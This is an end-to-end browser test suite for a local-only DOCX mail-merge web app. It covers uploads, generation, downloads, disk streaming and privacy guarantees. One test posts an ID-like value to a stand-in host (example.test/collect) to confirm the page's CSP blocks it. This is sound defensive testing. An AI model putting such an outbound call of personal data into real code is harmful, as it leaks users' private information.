import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium, type Browser, type Page, type Request } from 'playwright';
import { createServer, type Server } from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import { unzipSync } from 'fflate';
import { readDocxText } from '@doclyst/core';
import { makeTemplate } from './helpers/template.js';
import { installFakeFileSystem, removeFileSystemAccess } from './helpers/fake-fs.js';

/**
 * End-to-end tests against the built page in a real browser.
 *
 * These exist mainly to hold the central privacy claim to account. Unit tests
 * can show the engine has no network code; only driving the actual page can
 * show that loading a template and a spreadsheet full of personal data, and
 * generating a folder of documents from them, causes no request to leave the
 * page.
 */

const DIST = fileURLToPath(new URL('../dist', import.meta.url));

const CSV = `Full Name,Basic Salary,Staff ID
Aisha Rahman,4500,EMP-0001
Wei Lun Tan,5200,EMP-0002
Priya Nair,6100,EMP-0003
`;

const MIME: Record<string, string> = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
};

let server: Server;
let browser: Browser;
let origin: string;

beforeAll(async () => {
  if (!existsSync(join(DIST, 'index.html'))) {
    throw new Error('Build the web app before running browser tests: npm run build');
  }

  server = createServer((req, res) => {
    const requested = decodeURIComponent((req.url ?? '/').split('?')[0] ?? '/');
    const relative = normalize(requested).replace(/^(\.\.[/\\])+/, '');
    const path = join(DIST, relative === '/' ? 'index.html' : relative);
    if (!path.startsWith(DIST) || !existsSync(path)) {
      res.writeHead(404).end();
      return;
    }
    readFile(path).then(
      (body) => {
        res.writeHead(200, { 'content-type': MIME[extname(path)] ?? 'application/octet-stream' });
        res.end(body);
      },
      () => res.writeHead(500).end(),
    );
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  origin = `http://127.0.0.1:${typeof address === 'object' && address ? address.port : 0}`;

  browser = await launchChromium();
}, 60_000);

/**
 * Launch the browser, preferring whatever Playwright resolves for itself.
 *
 * Environments that pre-install Chromium expose it at a fixed path, so that is
 * used as a fallback rather than downloading anything.
 */
async function launchChromium(): Promise<Browser> {
  try {
    return await chromium.launch();
  } catch (error) {
    const preinstalled = '/opt/pw-browsers/chromium';
    if (!existsSync(preinstalled)) throw error;
    return chromium.launch({ executablePath: preinstalled });
  }
}

afterAll(async () => {
  await browser?.close();
  await new Promise<void>((resolve) => server?.close(() => resolve()));
});

/** Open the page, recording every request the browser attempts. */
async function openPage(): Promise<{ page: Page; requests: Request[] }> {
  const page = await browser.newPage();
  const requests: Request[] = [];
  page.on('request', (request) => requests.push(request));
  await page.goto(origin, { waitUntil: 'networkidle' });
  return { page, requests };
}

/** Requests to anywhere other than loading the page's own assets. */
function offOriginRequests(requests: readonly Request[]): string[] {
  return requests.map((r) => r.url()).filter((url) => !url.startsWith(origin));
}

async function loadInputs(page: Page): Promise<void> {
  await page.setInputFiles('#template-input', {
    name: 'offer.docx',
    mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
  });
  await page.setInputFiles('#data-input', {
    name: 'staff.csv',
    mimeType: 'text/csv',
    buffer: Buffer.from(CSV),
  });
}

describe('the built page', () => {
  it('loads without console errors', async () => {
    const errors: string[] = [];
    const page = await browser.newPage();
    page.on('console', (message) => {
      if (message.type() === 'error') errors.push(message.text());
    });
    page.on('pageerror', (error) => errors.push(error.message));
    await page.goto(origin, { waitUntil: 'networkidle' });

    expect(errors).toEqual([]);
    await page.close();
  });

  it('keeps the worksheet picker hidden for a CSV', async () => {
    // Regression guard: `hidden` is overridden by the layout rules unless the
    // stylesheet forces it, and the attribute alone reads as correct in tests.
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#data-summary')).toContain('3 rows');
    expect(await page.locator('#sheet-row').isVisible()).toBe(false);
    await page.close();
  });

  it('hides the progress bar once a run finishes', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');
    expect(await page.locator('#progress').isVisible()).toBe(false);
    await page.close();
  });

  it('reports the template"s placeholders', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#template-summary')).toContain('FULL_NAME');
    await page.close();
  });

  it('reports the data"s columns and row count', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect.poll(() => page.textContent('#data-summary')).toContain('3 rows');
    expect(await page.textContent('#data-summary')).toContain('Full Name');
    await page.close();
  });

  it('confirms when every placeholder has a matching column', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await expect
      .poll(() => page.textContent('#data-summary'))
      .toContain('Every template placeholder has a matching column');
    await page.close();
  });

  it('generates one document per row and offers each for download', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');

    await expect.poll(() => page.textContent('#results')).toContain('3 documents ready');
    expect(await page.locator('.file-list li').count()).toBe(3);
    expect(await page.textContent('.file-list')).toContain('document-0001.docx');
    await page.close();
  });

  it('produces a document whose content is correctly substituted', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');

    const download = page.waitForEvent('download');
    await page.locator('.file-list button').first().click();
    const stream = await (await download).createReadStream();
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);

    const text = readDocxText(new Uint8Array(Buffer.concat(chunks)));
    expect(text).toContain('Aisha Rahman');
    expect(text).toContain('4500');
    // One person's data must not appear in another's document.
    expect(text).not.toContain('Wei Lun Tan');
    await page.close();
  });

  it('packs every document into a downloadable ZIP', async () => {
    const { page } = await openPage();
    await loadInputs(page);
    await page.click('#generate');
    await expect.poll(() => page.textContent('#results')).toContain('documents ready');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Download all as ZIP' }).click();
    const stream = await (await download).createReadStream();
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);

    const entries = unzipSync(new Uint8Array(Buffer.concat(chunks)));
    expect(Object.keys(entries).sort()).toEqual([
      'document-0001.docx',
      'document-0002.docx',
      'document-0003.docx',
    ]);
    await page.close();
  });

  describe('batch size', () => {
    it('reports the total size of the generated documents', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('Total size:');
      await page.close();
    });

    it('does not warn about size for an ordinary batch', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');
      expect(await page.textContent('#results')).not.toContain('may fail to save');
      await page.close();
    });

    it('handles a batch of 400 records', async () => {
      // The scale this tool exists for. Asserts the page stays functional and
      // every row produces its own correctly-named document.
      const rows = Array.from(
        { length: 400 },
        (_, i) => `Person ${i},${3000 + i},EMP-${String(i).padStart(4, '0')}`,
      ).join('\n');
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from(`Full Name,Basic Salary,Staff ID\n${rows}\n`),
      });
      await page.click('#generate');

      await expect.poll(() => page.textContent('#results'), { timeout: 60_000 })
        .toContain('400 documents ready');
      expect(await page.locator('.file-list li').count()).toBe(400);
      expect(await page.textContent('.file-list')).toContain('document-0400.docx');
      await page.close();
    }, 90_000);
  });

  describe('nothing leaves the device', () => {
    it('makes no off-origin request while generating a whole batch', async () => {
      // The load-bearing test for the product's central claim.
      const { page, requests } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');

      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: 'Download all as ZIP' }).click();
      await download;

      expect(offOriginRequests(requests)).toEqual([]);
      await page.close();
    });

    it('is blocked by its own policy even if code tried to send data', async () => {
      // Belt and braces: the page's CSP must refuse an outbound request, so
      // the guarantee does not rest on our code staying careful.
      const { page } = await openPage();
      const blocked = await page.evaluate(async () => {
        try {
          await fetch('https://example.test/collect', {
            method: 'POST',
            body: 'S0000001A',
          });
          return 'allowed';
        } catch {
          return 'blocked';
        }
      });
      expect(blocked).toBe('blocked');
      await page.close();
    });

    it('persists nothing to browser storage', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');

      const stored = await page.evaluate(() => ({
        local: localStorage.length,
        session: sessionStorage.length,
        cookies: document.cookie,
        workers: navigator.serviceWorker?.controller !== undefined
          && navigator.serviceWorker?.controller !== null,
      }));
      expect(stored).toEqual({ local: 0, session: 0, cookies: '', workers: false });
      await page.close();
    });
  });

describe('choosing files', () => {
    it('marks a drop zone as loaded and names the file', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await expect.poll(() => page.textContent('#template-drop')).toContain('offer.docx');
      expect(await page.locator('#template-drop.loaded').count()).toBe(1);
      expect(await page.locator('#data-drop.loaded').count()).toBe(1);
      await page.close();
    });

    it('returns a zone to its prompt when the file is cleared', async () => {
      const { page } = await openPage();
      await loadInputs(page);
      await expect.poll(() => page.locator('#template-drop.loaded').count()).toBe(1);

      await page.setInputFiles('#template-input', []);
      await expect.poll(() => page.locator('#template-drop.loaded').count()).toBe(0);
      expect(await page.textContent('#template-drop')).toContain('Choose a template');
      await page.close();
    });

    it('accepts a file dropped onto the zone', async () => {
      // Dropping must land on the same code path as the picker, so the file is
      // routed through the input rather than handled separately.
      const { page } = await openPage();
      const template = Array.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY']));

      await page.evaluate(async (bytes) => {
        const file = new File([new Uint8Array(bytes)], 'dropped.docx', {
          type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        });
        const transfer = new DataTransfer();
        transfer.items.add(file);
        document
          .getElementById('template-drop')!
          .dispatchEvent(new DragEvent('drop', { dataTransfer: transfer, bubbles: true }));
      }, template);

      await expect.poll(() => page.textContent('#template-summary')).toContain('FULL_NAME');
      expect(await page.textContent('#template-drop')).toContain('dropped.docx');
      await page.close();
    });

    it('highlights the zone while a file is dragged over it', async () => {
      const { page } = await openPage();
      await page.evaluate(() => {
        document
          .getElementById('data-drop')!
          .dispatchEvent(new DragEvent('dragover', { bubbles: true, cancelable: true }));
      });
      expect(await page.locator('#data-drop.dragging').count()).toBe(1);

      await page.evaluate(() => {
        document.getElementById('data-drop')!.dispatchEvent(new DragEvent('dragleave', { bubbles: true }));
      });
      expect(await page.locator('#data-drop.dragging').count()).toBe(0);
      await page.close();
    });

    it('keeps the file input reachable as the labelled control', async () => {
      // The input is visually hidden but must remain the real control, or the
      // zone stops being usable by keyboard and assistive technology.
      const { page } = await openPage();
      const wired = await page.evaluate(() => {
        const label = document.querySelector('#template-drop') as HTMLLabelElement;
        const input = document.getElementById('template-input') as HTMLInputElement;
        return { htmlFor: label.htmlFor, id: input.id, disabled: input.disabled };
      });
      expect(wired).toEqual({ htmlFor: 'template-input', id: 'template-input', disabled: false });
      await page.close();
    });
  });

  describe('writing straight to disk', () => {
    /** Open the page with the File System Access pickers faked out. */
    async function openWithFakeFs(): Promise<Page> {
      const page = await browser.newPage();
      await page.addInitScript(installFakeFileSystem);
      await page.goto(origin, { waitUntil: 'networkidle' });
      return page;
    }

    /** Read back what the fake filesystem recorded. */
    async function written(page: Page): Promise<Record<string, Buffer>> {
      const raw = await page.evaluate(
        () => (window as unknown as { __fakeFs: { written: Record<string, number[]> } }).__fakeFs.written,
      );
      return Object.fromEntries(Object.entries(raw).map(([k, v]) => [k, Buffer.from(v)]));
    }

    it('offers the streaming actions when the browser supports them', async () => {
      const page = await openWithFakeFs();
      expect(await page.locator('#save-folder').isVisible()).toBe(true);
      expect(await page.locator('#save-zip').isVisible()).toBe(true);
      await page.close();
    });

    it('hides them on a browser without the API', async () => {
      // Firefox and Safari have no File System Access API; the download path
      // must remain the whole interface there.
      const page = await browser.newPage();
      await page.addInitScript(removeFileSystemAccess);
      await page.goto(origin, { waitUntil: 'networkidle' });

      expect(await page.locator('#save-folder').isVisible()).toBe(false);
      expect(await page.locator('#save-zip').isVisible()).toBe(false);
      // The in-memory route still works.
      await loadInputs(page);
      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('3 documents ready');
      await page.close();
    });

    it('writes one file per record into the chosen folder', async () => {
      const page = await openWithFakeFs();
      await loadInputs(page);
      await page.click('#save-folder');

      await expect.poll(() => page.textContent('#results')).toContain('3 documents written');
      const files = await written(page);
      expect(Object.keys(files).sort()).toEqual([
        'document-0001.docx',
        'document-0002.docx',
        'document-0003.docx',
      ]);
      await page.close();
    });

    it('writes documents whose content is correctly substituted', async () => {
      const page = await openWithFakeFs();
      await loadInputs(page);
      await page.click('#save-folder');
      await expect.poll(() => page.textContent('#results')).toContain('3 documents written');

      const files = await written(page);
      const first = readDocxText(new Uint8Array(files['document-0001.docx']!));
      expect(first).toContain('Aisha Rahman');
      expect(first).toContain('4500');
      // One person's data must not reach another's document.
      expect(first).not.toContain('Wei Lun Tan');
      expect(readDocxText(new Uint8Array(files['document-0002.docx']!))).toContain('Wei Lun Tan');
      await page.close();
    });

    it('holds only one document open at a time', async () => {
      // The property the streaming path exists for. If documents accumulated,
      // writing to disk would not have removed the memory ceiling.
      const page = await openWithFakeFs();
      await loadInputs(page);
      await page.click('#save-folder');
      await expect.poll(() => page.textContent('#results')).toContain('3 documents written');

      const stats = await page.evaluate(
        () => (window as unknown as { __fakeFs: { stats: () => { maxOpenWritables: number } } })
          .__fakeFs.stats(),
      );
      expect(stats.maxOpenWritables).toBe(1);
      await page.close();
    });

    it('streams a valid ZIP to the chosen file', async () => {
      const page = await openWithFakeFs();
      await loadInputs(page);
      await page.click('#save-zip');
      await expect.poll(() => page.textContent('#results')).toContain('3 documents written');

      const files = await written(page);
      const archive = files['doclyst-documents.zip'];
      expect(archive).toBeTruthy();

      // The decisive check: the incrementally written archive must actually
      // parse, with every document intact.
      const entries = unzipSync(new Uint8Array(archive!));
      expect(Object.keys(entries).sort()).toEqual([
        'document-0001.docx',
        'document-0002.docx',
        'document-0003.docx',
      ]);
      expect(readDocxText(entries['document-0001.docx']!)).toContain('Aisha Rahman');
      await page.close();
    });

    it('produces a streamed ZIP equivalent to the in-memory one', async () => {
      const page = await openWithFakeFs();
      await loadInputs(page);
      await page.click('#save-zip');
      await expect.poll(() => page.textContent('#results')).toContain('3 documents written');
      const streamed = unzipSync(new Uint8Array((await written(page))['doclyst-documents.zip']!));

      await page.click('#generate');
      await expect.poll(() => page.textContent('#results')).toContain('documents ready');
      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: 'Download all as ZIP' }).click();
      const stream = await (await download).createReadStream();
      const chunks: Buffer[] = [];
      for await (const chunk of stream) chunks.push(chunk as Buffer);
      const inMemory = unzipSync(new Uint8Array(Buffer.concat(chunks)));

      expect(Object.keys(streamed).sort()).toEqual(Object.keys(inMemory).sort());
      for (const name of Object.keys(inMemory)) {
        expect(streamed[name]).toEqual(inMemory[name]);
      }
      await page.close();
    });

    it('reports a failing row and still writes the rest', async () => {
      const page = await openWithFakeFs();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from('Full Name,Basic Salary\nAisha Rahman,4500\nWei Lun Tan,\n'),
      });
      await page.check('#empty-is-missing');
      await page.click('#save-folder');

      await expect.poll(() => page.textContent('#results')).toContain('1 row(s) failed');
      expect(Object.keys(await written(page))).toEqual(['document-0001.docx']);
      const failures = (await page.textContent('.failure-list')) ?? '';
      expect(failures).toContain('Row 2');
      expect(failures).not.toContain('Wei Lun Tan');
      await page.close();
    });

    it('treats a dismissed picker as a decision, not an error', async () => {
      const page = await browser.newPage();
      await page.addInitScript(installFakeFileSystem);
      await page.addInitScript(`
        window.showDirectoryPicker = async () => {
          throw new DOMException('The user aborted a request.', 'AbortError');
        };
      `);
      await page.goto(origin, { waitUntil: 'networkidle' });
      await loadInputs(page);
      await page.click('#save-folder');

      await page.waitForTimeout(300);
      expect((await page.textContent('#results')) ?? '').toBe('');
      expect(await page.locator('#progress').isVisible()).toBe(false);
      await page.close();
    });

    it('reports a disk failure instead of claiming success', async () => {
      const page = await browser.newPage();
      await page.addInitScript(installFakeFileSystem);
      await page.addInitScript(`
        const realPicker = window.showDirectoryPicker;
        window.showDirectoryPicker = async () => {
          const dir = await realPicker();
          let calls = 0;
          return {
            ...dir,
            async getFileHandle(name) {
              calls += 1;
              if (calls > 1) throw new DOMException('Quota exceeded.', 'QuotaExceededError');
              return dir.getFileHandle(name);
            },
          };
        };
      `);
      await page.goto(origin, { waitUntil: 'networkidle' });
      await loadInputs(page);
      await page.click('#save-folder');

      await expect.poll(() => page.textContent('#results')).toContain('Stopped after 1 document');
      await page.close();
    });

    it('makes no off-origin request while streaming to disk', async () => {
      const page = await browser.newPage();
      const requests: string[] = [];
      page.on('request', (r) => { if (!r.url().startsWith(origin)) requests.push(r.url()); });
      await page.addInitScript(installFakeFileSystem);
      await page.goto(origin, { waitUntil: 'networkidle' });
      await loadInputs(page);
      await page.click('#save-zip');
      await expect.poll(() => page.textContent('#results')).toContain('documents written');

      expect(requests).toEqual([]);
      await page.close();
    });
  });

  describe('failures', () => {
    it('warns about a placeholder no column can fill', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'NRIC'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from(CSV),
      });
      await expect.poll(() => page.textContent('#data-summary')).toContain('No column matches: NRIC');
      await page.close();
    });

    it('reports a failing row without showing any value from it', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'offer.docx',
        mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        buffer: Buffer.from(makeTemplate(['FULL_NAME', 'BASIC_SALARY'])),
      });
      await page.setInputFiles('#data-input', {
        name: 'staff.csv',
        mimeType: 'text/csv',
        buffer: Buffer.from('Full Name,Basic Salary\nAisha Rahman,4500\nWei Lun Tan,\n'),
      });
      await page.check('#empty-is-missing');
      await page.click('#generate');

      await expect.poll(() => page.textContent('#results')).toContain('1 row(s) failed');
      const failures = (await page.textContent('.failure-list')) ?? '';
      expect(failures).toContain('Row 2');
      expect(failures).toContain('BASIC_SALARY');
      expect(failures).not.toContain('Wei Lun Tan');
      await page.close();
    });

    it('rejects a file that is not a template', async () => {
      const { page } = await openPage();
      await page.setInputFiles('#template-input', {
        name: 'notes.docx',
        mimeType: 'application/octet-stream',
        buffer: Buffer.from('this is not a document'),
      });
      await expect.poll(() => page.textContent('#template-summary')).toContain('.docx or .pdf');
      await page.close();
    });

    it('warns when a filename pattern would expose an identifier', async () => {
      const { page } = await openPage();
      await page.fill('#filename-input', '{{NRIC}}-offer');
      await expect
        .poll(() => page.textContent('#filename-warnings'))
        .toContain('visible without opening');
      await page.close();
    });
  });
});
